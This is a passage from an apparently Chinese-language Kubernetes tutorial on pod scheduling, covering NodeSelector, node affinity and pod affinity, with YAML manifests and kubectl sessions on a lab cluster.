</span><br></pre></td></tr></table></figure><p><strong>NodeSelector</strong></p><p>NodeSelector用于将pod调度到添加了指定标签的node节点上。它是通过kubernetes的label-selector机制实现的，也就是说，在pod创建之前，会由scheduler使用MatchNodeSelector调度策略进行label匹配，找出目标node，然后将pod调度到目标节点，该匹配规则是强制约束。</p><p>接下来，实验一下：</p><p>1 首先分别为node节点添加标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro</span><br><span class="line">node/node2 labeled</span><br><span class="line">[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test</span><br><span class="line">node/node2 labeled</span><br></pre></td></tr></table></figure><p>2 创建一个pod-nodeselector.yaml文件，并使用它创建Pod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-nodeselector</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">nodeSelector:</span> </span><br><span class="line">    <span class="attr">nodeenv:</span> <span class="string">pro</span> <span class="comment"># 指定调度到具有nodeenv=pro标签的节点上</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml</span><br><span class="line">pod/pod-nodeselector created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看Pod调度到NODE属性，确实是调度到了node1节点上</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide</span><br><span class="line">NAME               READY   STATUS    RESTARTS   AGE     IP          NODE    ......</span><br><span class="line">pod-nodeselector   1/1     Running   0          47s   10.244.1.87   node1   ......</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来，删除pod，修改nodeSelector的值为nodeenv: xxxx（不存在打有此标签的节点）</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml</span><br><span class="line">pod &quot;pod-nodeselector&quot; deleted</span><br><span class="line">[root@k8s-master01 ~]# vim pod-nodeselector.yaml</span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml</span><br><span class="line">pod/pod-nodeselector created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再次查看，发现pod无法正常运行,Node的值为none</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide</span><br><span class="line">NAME               READY   STATUS    RESTARTS   AGE     IP       NODE    </span><br><span class="line">pod-nodeselector   0/1     Pending   0          2m20s   &lt;none&gt;   &lt;none&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看详情,发现node selector匹配失败的提示</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev</span><br><span class="line">.......</span><br><span class="line">Events:</span><br><span class="line">  Type     Reason            Age        From               Message</span><br><span class="line">  ----     ------            ----       ----               -------</span><br><span class="line">  Warning  FailedScheduling  &lt;unknown&gt;  default-scheduler  0/3 nodes are available: 3 node(s) didn&#x27;t match node selector.</span><br></pre></td></tr></table></figure><h3 id="5-4-2-亲和性调度"><a href="#5-4-2-亲和性调度" class="headerlink" title="5.4.2 亲和性调度"></a>5.4.2 亲和性调度</h3><p>上一节，介绍了两种定向调度的方式，使用起来非常方便，但是也有一定的问题，那就是如果没有满足条件的Node，那么Pod将不会被运行，即使在集群中还有可用Node列表也不行，这就限制了它的使用场景。</p><p>基于上面的问题，kubernetes还提供了一种亲和性调度（Affinity）。它在NodeSelector的基础之上的进行了扩展，可以通过配置的形式，实现优先选择满足条件的Node进行调度，如果没有，也可以调度到不满足条件的节点上，使调度更加灵活。</p><p>Affinity主要分为三类：</p><ul><li>nodeAffinity(node亲和性）: 以node为目标，解决pod可以调度到哪些node的问题</li><li>podAffinity(pod亲和性) : 以pod为目标，解决pod可以和哪些已存在的pod部署在同一个拓扑域中的问题</li><li>podAntiAffinity(pod反亲和性) : 以pod为目标，解决pod不能和哪些已存在pod部署在同一个拓扑域中的问题</li></ul><blockquote><p>关于亲和性(反亲和性)使用场景的说明：</p><p><strong>亲和性</strong>：如果两个应用频繁交互，那就有必要利用亲和性让两个应用的尽可能的靠近，这样可以减少因网络通信而带来的性能损耗。</p><p><strong>反亲和性</strong>：当应用的采用多副本部署时，有必要采用反亲和性让各个应用实例打散分布在各个node上，这样可以提高服务的高可用性。</p></blockquote><p><strong>NodeAffinity</strong></p><p>首先来看一下<code>NodeAffinity</code>的可配置项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pod.spec.affinity.nodeAffinity</span><br><span class="line">  requiredDuringSchedulingIgnoredDuringExecution  Node节点必须满足指定的所有规则才可以，相当于硬限制</span><br><span class="line">    nodeSelectorTerms  节点选择列表</span><br><span class="line">      matchFields   按节点字段列出的节点选择器要求列表</span><br><span class="line">      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)</span><br><span class="line">        key    键</span><br><span class="line">        values 值</span><br><span class="line">        operator 关系符 支持Exists, DoesNotExist, In, NotIn, Gt, Lt</span><br><span class="line">  preferredDuringSchedulingIgnoredDuringExecution 优先调度到满足指定的规则的Node，相当于软限制 (倾向)</span><br><span class="line">    preference   一个节点选择器项，与相应的权重相关联</span><br><span class="line">      matchFields   按节点字段列出的节点选择器要求列表</span><br><span class="line">      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)</span><br><span class="line">        key    键</span><br><span class="line">        values 值</span><br><span class="line">        operator 关系符 支持In, NotIn, Exists, DoesNotExist, Gt, Lt</span><br><span class="line">weight 倾向权重，在范围1-100。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">关系符的使用说明:</span><br><span class="line"></span><br><span class="line">- matchExpressions:</span><br><span class="line">  - key: nodeenv              # 匹配存在标签的key为nodeenv的节点</span><br><span class="line">    operator: Exists</span><br><span class="line">  - key: nodeenv              # 匹配标签的key为nodeenv,且value是&quot;xxx&quot;或&quot;yyy&quot;的节点</span><br><span class="line">    operator: In</span><br><span class="line">    values: [&quot;xxx&quot;,&quot;yyy&quot;]</span><br><span class="line">  - key: nodeenv              # 匹配标签的key为nodeenv,且value大于&quot;xxx&quot;的节点</span><br><span class="line">    operator: Gt</span><br><span class="line">    values: &quot;xxx&quot;</span><br></pre></td></tr></table></figure><p>接下来首先演示一下<code>requiredDuringSchedulingIgnoredDuringExecution</code> ,</p><p>创建pod-nodeaffinity-required.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-nodeaffinity-required</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">affinity:</span>  <span class="comment">#亲和性设置</span></span><br><span class="line">    <span class="attr">nodeAffinity:</span> <span class="comment">#设置node亲和性</span></span><br><span class="line">      <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span> <span class="comment"># 硬限制</span></span><br><span class="line">        <span class="attr">nodeSelectorTerms:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">matchExpressions:</span> <span class="comment"># 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">nodeenv</span></span><br><span class="line">            <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">            <span class="attr">values:</span> [<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;yyy&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml</span><br><span class="line">pod/pod-nodeaffinity-required created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod状态 （运行失败）</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide</span><br><span class="line">NAME                        READY   STATUS    RESTARTS   AGE   IP       NODE    ...... </span><br><span class="line">pod-nodeaffinity-required   0/1     Pending   0          16s   &lt;none&gt;   &lt;none&gt;  ......</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod的详情</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现调度失败，提示node选择失败</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev</span><br><span class="line">......</span><br><span class="line">  Warning  FailedScheduling  &lt;unknown&gt;  default-scheduler  0/3 nodes are available: 3 node(s) didn&#x27;t match node selector.</span><br><span class="line">  Warning  FailedScheduling  &lt;unknown&gt;  default-scheduler  0/3 nodes are available: 3 node(s) didn&#x27;t match node selector.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">接下来，停止pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml</span><br><span class="line">pod &quot;pod-nodeaffinity-required&quot; deleted</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改文件，将values: [<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;yyy&quot;</span>]------&gt; [<span class="string">&quot;pro&quot;</span>,<span class="string">&quot;yyy&quot;</span>]</span></span><br><span class="line">[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次启动</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml</span><br><span class="line">pod/pod-nodeaffinity-required created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时查看，发现调度成功，已经将pod调度到了node1上</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide</span><br><span class="line">NAME                        READY   STATUS    RESTARTS   AGE   IP            NODE  ...... </span><br><span class="line">pod-nodeaffinity-required   1/1     Running   0          11s   10.244.1.89   node1 ......</span><br></pre></td></tr></table></figure><p>接下来再演示一下<code>requiredDuringSchedulingIgnoredDuringExecution</code> ,</p><p>创建pod-nodeaffinity-preferred.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-nodeaffinity-preferred</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">affinity:</span>  <span class="comment">#亲和性设置</span></span><br><span class="line">    <span class="attr">nodeAffinity:</span> <span class="comment">#设置node亲和性</span></span><br><span class="line">      <span class="attr">preferredDuringSchedulingIgnoredDuringExecution:</span> <span class="comment"># 软限制</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">weight:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">preference:</span></span><br><span class="line">          <span class="attr">matchExpressions:</span> <span class="comment"># 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签(当前环境没有)</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">nodeenv</span></span><br><span class="line">            <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">            <span class="attr">values:</span> [<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;yyy&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml</span><br><span class="line">pod/pod-nodeaffinity-preferred created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod状态 （运行成功）</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev</span><br><span class="line">NAME                         READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-nodeaffinity-preferred   1/1     Running   0          40s</span><br></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NodeAffinity规则设置的注意事项：</span><br><span class="line">    <span class="number">1</span> 如果同时定义了nodeSelector和nodeAffinity，那么必须两个条件都得到满足，Pod才能运行在指定的<span class="keyword">Node</span><span class="title">上</span></span><br><span class="line"><span class="title">    2</span> 如果nodeAffinity指定了多个nodeSelectorTerms，那么只需要其中一个能够匹配成功即可</span><br><span class="line">    <span class="number">3</span> 如果一个nodeSelectorTerms中有多个matchExpressions ，则一个节点必须满足所有的才能匹配成功</span><br><span class="line">    <span class="number">4</span> 如果一个pod所在的<span class="keyword">Node</span><span class="title">在Pod</span>运行期间其标签发生了改变，不再符合该Pod的节点亲和性需求，则系统将忽略此变化</span><br></pre></td></tr></table></figure><p><strong>PodAffinity</strong></p><p>PodAffinity主要实现以运行的Pod为参照，实现让新创建的Pod跟参照pod在一个区域的功能。</p><p>首先来看一下<code>PodAffinity</code>的可配置项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pod.spec.affinity.podAffinity</span><br><span class="line">  requiredDuringSchedulingIgnoredDuringExecution  硬限制</span><br><span class="line">    namespaces       指定参照pod的namespace</span><br><span class="line">    topologyKey      指定调度作用域</span><br><span class="line">    labelSelector    标签选择器</span><br><span class="line">      matchExpressions  按节点标签列出的节点选择器要求列表(推荐)</span><br><span class="line">        key    键</span><br><span class="line">        values 值</span><br><span class="line">        operator 关系符 支持In, NotIn, Exists, DoesNotExist.</span><br><span class="line">      matchLabels    指多个matchExpressions映射的内容</span><br><span class="line">  preferredDuringSchedulingIgnoredDuringExecution 软限制</span><br><span class="line">    podAffinityTerm  选项</span><br><span class="line">      namespaces      </span><br><span class="line">      topologyKey</span><br><span class="line">      labelSelector</span><br><span class="line">        matchExpressions  </span><br><span class="line">          key    键</span><br><span class="line">          values 值</span><br><span class="line">          operator</span><br><span class="line">        matchLabels </span><br><span class="line">    weight 倾向权重，在范围1-100</span><br></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">topologyKey用于指定调度时作用域,例如:</span><br><span class="line">    如果指定为kubernetes.io/hostname，那就是以<span class="keyword">Node</span><span class="title">节点为区分范围</span></span><br><span class="line"><span class="title">如果指定为beta</span>.kubernetes.io/os,则以<span class="keyword">Node</span><span class="title">节点的操作系统类型来区分</span></span><br></pre></td></tr></table></figure><p>接下来，演示下<code>requiredDuringSchedulingIgnoredDuringExecution</code>,</p><p>1）首先创建一个参照Pod，pod-podaffinity-target.yaml：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-podaffinity-target</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">podenv:</span> <span class="string">pro</span> <span class="comment">#设置标签</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">nodeName:</span> <span class="string">node1</span> <span class="comment"># 将目标pod名确指定到node1上</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动目标pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml</span><br><span class="line">pod/pod-podaffinity-target created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod状况</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev</span><br><span class="line">NAME                     READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-podaffinity-target   1/1     Running   0          4s</span><br></pre></td></tr></table></figure><p>2）创建pod-podaffinity-required.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-podaffinity-required</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">affinity:</span>  <span class="comment">#亲和性设置</span></span><br><span class="line">    <span class="attr">podAffinity:</span> <span class="comment">#设置pod亲和性</span></span><br><span class="line">      <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span> <span class="comment"># 硬限制</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">labelSelector:</span></span><br><span class="line">          <span class="attr">matchExpressions:</span> <span class="comment"># 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">podenv</span></span><br><span class="line">            <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">            <span class="attr">values:</span> [<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;yyy&quot;</span>]</span><br><span class="line">        <span class="attr">topologyKey:</span> <span class="string">kubernetes.io/hostname</span></span><br></pre></td></tr></table></figure><p>上面配置表达的意思是：新Pod必须要与拥有标签nodeenv&#x3D;xxx或者nodeenv&#x3D;yyy的pod在同一Node上，显然现在没有这样pod，接下来，运行测试一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml</span><br><span class="line">pod/pod-podaffinity-required created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod状态，发现未运行</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev</span><br><span class="line">NAME                       READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-podaffinity-required   0/1     Pending   0          9s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看详细信息</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev</span><br><span class="line">......</span><br><span class="line">Events:</span><br><span class="line">  Type     Reason            Age        From               Message</span><br><span class="line">  ----     ------            ----       ----               -------</span><br><span class="line">  Warning  FailedScheduling  &lt;unknown&gt;  default-scheduler  0/3 nodes are available: 2 node(s) didn&#x27;t match pod affinity rules, 1 node(s) had taints that the pod didn&#x27;t tolerate.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来修改  values: [<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;yyy&quot;</span>]-----&gt;values:[<span class="string">&quot;pro&quot;</span>,<span class="string">&quot;yyy&quot;</span>]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">意思是：新Pod必须要与拥有标签nodeenv=xxx或者nodeenv=yyy的pod在同一Node上</span></span><br><span class="line">[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后重新创建pod，查看效果</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml</span><br><span class="line">pod &quot;pod-podaffinity-required&quot; deleted</span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml</span><br><span class="line">pod/pod-podaffinity-required created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现此时Pod运行正常</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev</span><br><span class="line">NAME                       READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">pod-podaffinity-required   1/1     Running   0          6s    &lt;none&gt;</span><br></pre></td></tr></table></figure><p>关于<code>PodAffinity</code>的 <code>preferredDuringSchedulingIgnoredDuringExecution</code>，这里不再演示。</p><p><strong>PodAntiAffinity</strong></p><p>PodAntiAffinity主要实现以运行的Pod为参照，让新创建的Pod跟参照pod不在一个区域中的功能。</p><p>它的配置方式和选项跟PodAffinty是一样的，这里不再做详细解释，直接做一个测试案例。</p><p>1）继续使用上个案例中目标pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels</span><br><span class="line">NAME                     READY   STATUS    RESTARTS   AGE     IP            NODE    LABELS</span><br><span class="line">pod-podaffinity-required 1/1     Running   0          3m29s   10.244.1.38   node1   &lt;none&gt;     </span><br><span class="line">pod-podaffinity-target   1/1     Running   0          9m25s   10.244.1.37   node1   podenv=pro</span><br></pre></td></tr></table></figure><p>2）创建pod-podantiaffinity-required.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span 